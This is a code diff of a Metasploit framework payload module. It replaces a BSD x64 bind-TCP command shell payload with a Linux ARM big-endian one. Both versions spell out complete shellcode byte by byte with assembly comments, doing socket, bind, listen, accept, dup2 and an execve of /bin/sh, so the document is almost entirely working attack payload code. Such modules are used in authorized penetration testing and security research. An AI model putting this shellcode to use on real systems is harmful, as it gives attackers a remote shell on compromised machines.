@@ -8,79 +8,108 @@ require 'msf/core/handler/bind_tcp'
 require 'msf/base/sessions/command_shell'
 require 'msf/base/sessions/command_shell_options'
 
-module MetasploitModule
+module Metasploit4
 
-  CachedSize = 88
+  CachedSize = 118
 
   include Msf::Payload::Single
-  include Msf::Payload::Bsd
+  include Msf::Payload::Linux
   include Msf::Sessions::CommandShellOptions
 
   def initialize(info = {})
     super(merge_info(info,
-      'Name'          => 'BSD x64 Command Shell, Bind TCP Inline',
+      'Name'          => 'Linux ARM Big Endian Command Shell, Bind TCP Inline',
       'Description'   => 'Listen for a connection and spawn a command shell',
       'Author'        => 'Balazs Bucsay @xoreipeip <balazs.bucsay[-at-]rycon[-dot-]hu>',
-      'References'    => ['URL', 'https://github.com/earthquake/shellcodes/blob/master/x86_64_bsd_bind_tcp.asm.c'],
+      'References'    => ['URL', 'https://github.com/earthquake/shellcodes/blob/master/armeb_linux_ipv4_bind_tcp.s'],
       'License'       => MSF_LICENSE,
-      'Platform'      => 'bsd',
-      'Arch'          => ARCH_X86_64,
+      'Platform'      => 'linux',
+      'Arch'          => ARCH_ARMBE,
       'Handler'       => Msf::Handler::BindTcp,
-      'Session'       => Msf::Sessions::CommandShellUnix,
-      'Payload'       =>
-        {
-          'Offsets' =>
-            {
-              'LPORT'    => [ 18, 'n' ],
-            },
-          'Payload' =>
-            "\x6a\x61"             +#	pushq  $0x61                       #
-            "\x58"                 +#	pop    %rax                        #
-            "\x99"                 +#	cltd                               #
-            "\x6a\x02"             +#	pushq  $0x2                        #
-            "\x5f"                 +#	pop    %rdi                        #
-            "\x6a\x01"             +#	pushq  $0x1                        #
-            "\x5e"                 +#	pop    %rsi                        #
-            "\x0f\x05"             +#	syscall                            #
-            "\x48\x97"             +#	xchg   %rax,%rdi                   #
-            "\x52"                 +#	push   %rdx                        #
-            "\xba\x00\x02\x11\x5C" +#	mov edx,0x5c110200                 #
-            "\x52"                 +#	push   %rdx                        #
-            "\x48\x89\xe6"         +#	mov    %rsp,%rsi                   #
-            "\x6a\x10"             +#	pushq  $0x10                       #
-            "\x5a"                 +#	pop    %rdx                        #
-            "\x04\x66"             +#	add    $0x66,%al                   #
-            "\x0f\x05"             +#	syscall                            #
-            "\x48\x31\xf6"         +#	xor    %rsi,%rsi                   #
-            "\x6a\x6a"             +#	pushq  $0x6a                       #
-            "\x58"                 +#	pop    %rax                        #
-            "\x0f\x05"             +#	syscall                            #
-            "\x99"                 +#	cltd                               #
-            "\x04\x1e"             +#	add    $0x1e,%al                   #
-            "\x0f\x05"             +#	syscall                            #
-            "\x48\x89\xc7"         +#	mov    %rax,%rdi                   #
-            "\x6a\x5a"             +#	pushq  $0x5a                       #
-            "\x58"                 +#	pop    %rax                        #
-            "\x0f\x05"             +#	syscall                            #
-            "\xff\xc6"             +#	inc    %esi                        #
-            "\x04\x5a"             +#	add    $0x5a,%al                   #
-            "\x0f\x05"             +#	syscall                            #
-            "\xff\xc6"             +#	inc    %esi                        #
-            "\x04\x59"             +#	add    $0x59,%al                   #
-            "\x0f\x05"             +#	syscall                            #
-            "\x52"                 +#   push   %rdx                        #
-            "\x48\xbf\x2f\x2f"     +#   mov "//"                           #
-            "\x62\x69\x6e\x2f"     +#   "bin/sh"                           #
-            "\x73\x68"             +#   mov    $0x68732f6e69622f2f,%rdi    #
-            "\x57"                 +#	push   %rdi                        #
-            "\x48\x89\xe7"         +#	mov    %rsp,%rdi                   #
-            "\x52"                 +#	push   %rdx                        #
-            "\x57"                 +#	push   %rdi                        #
-            "\x48\x89\xe6"         +#	mov    %rsp,%rsi                   #
-            "\x04\x39"             +#	add    $0x39,%al                   #
-            "\x0f\x05"              #   syscall                            #
-        }
+      'Session'       => Msf::Sessions::CommandShellUnix
       ))
+    # Register command execution options
+    register_options(
+      [
+        OptString.new('CMD', [ true, "The command to execute.", "/bin/sh" ]),
+        Opt::LPORT(4444)
+      ], self.class)
   end
+  def generate
+    cmd = (datastore['CMD'] || '') + "\x00"
+    bytehigh = (datastore['LPORT'].to_i >> 8).chr
+    bytelow = (datastore['LPORT'].to_i & 0xFF).chr
 
+    payload =
+            # turning on thumb mode
+            "\xe2\x8f\x60\x01"	+#	add 	r6, pc, #1	#
+            "\xe1\x2f\xff\x16"	+#	bx	r6		#
+
+            # thumb mode on
+            # socket(2,1,0)
+            "\x1a\x92"		+#	sub	r2, r2, r2	#
+            "\x1c\x51"		+#	add	r1, r2, #1	#
+            "\x1c\x90"		+#	add	r0, r2, #2	#
+            "\x02\x0f"		+#	lsl	r7, r1, #8	#
+            "\x37\x19"		+#	add	r7, r7, #0x19	#
+            "\xdf\x01"		+#	svc	1		#
+            "\x1c\x06"		+#	mov	r6, r0		#
+
+            # bind()
+            "\x22\x02"		+#	mov	r2, #2		#
+            "\x02\x12"		+#	lsl	r2, r2, #8	#
+            "\x32"+bytehigh	+#	add	r2, r2, #0xXX	#
+            "\x02\x12"		+#	lsl	r2, r2, #8	#
+            "\x32"+bytelow	+#	add	r2, r2, #0xXX	#
+            "\x1a\xdb"		+#	sub	r3, r3, r3	#
+            "\x1b\x24"		+#	sub	r4, r4, r4	#
+            "\x1b\x6d"		+#	sub 	r5, r5, r5	#
+            "\x46\x69"		+#	mov	r1, sp		#
+            "\xc1\x3c"		+#	stm	r1!, {r2-r5}	#
+            "\x39\x10"		+#	sub	r1, #0x10	#
+            "\x22\x10"		+#	mov	r2, #16		#
+            "\x37\x01"		+#	add	r7, r7, #1	#
+            "\xdf\x01"		+#	svc	1		#
+
+            # listen()
+            "\x1c\x30"		+#	mov	r0, r6		#
+            "\x1a\x49"		+#	sub	r1, r1, r1	#
+            "\x37\x02"		+#	add	r7, r7, #2	#
+            "\xdf\x01"		+#	svc	1		#
+
+            # accept()
+            "\x1c\x30"		+#	mov	r0, r6		#
+            "\x1a\x92"		+#	sub	r2, r2, r2	#
+            "\x37\x01"		+#	add	r7, r7, #1	#
+            "\xdf\x01"		+#	svc	1		#
+            "\x1c\x06"		+#	mov	r6, r0		#
+
+            # dup2()
+            "\x1a\x49"		+#	sub	r1, r1, r1	#
+            "\x27\x3f"		+#	mov	r7, #63	#
+            "\xdf\x01"		+#	svc     1		#
+            "\x1c\x30"		+#	mov	r0, r6	#
+            "\x31\x01"		+#	add	r1, r1, #1	#
+            "\xdf\x01"		+#	svc     1		#
+            "\x1c\x30"		+#	mov	r0, r6	#
+            "\x31\x01"		+#	add	r1, r1, #1	#
+            "\xdf\x01"		+#	svc     1		#
+
+            # execve()
+            "\x1a\x92"		+#	sub	r2, r2, r2	#
+            "\x46\x78"		+#	mov 	r0, pc		#
+            "\x30\x12"		+#	add 	r0, #18		#
+            "\x92\x02"		+#	str	r2, [sp, #8]	#
+            "\x90\x01"		+#	str	r0, [sp, #4]	#
+            "\xa9\x01"		+#	add 	r1, sp, #4	#
+            "\x27\x0b"		+#	mov 	r7, #11		#
+            "\xdf\x01"		+#	svc 	1		#
+
+            # exit()
+            "\x1b\x24"		+#	sub	r4, r4, r4	#
+            "\x1c\x20"		+#	mov	r0, r4		#
+            "\x27\x01"		+#	mov 	r7, #1		#
+            "\xdf\x01"		+#	svc 	1		#
+            cmd
+  end
 end
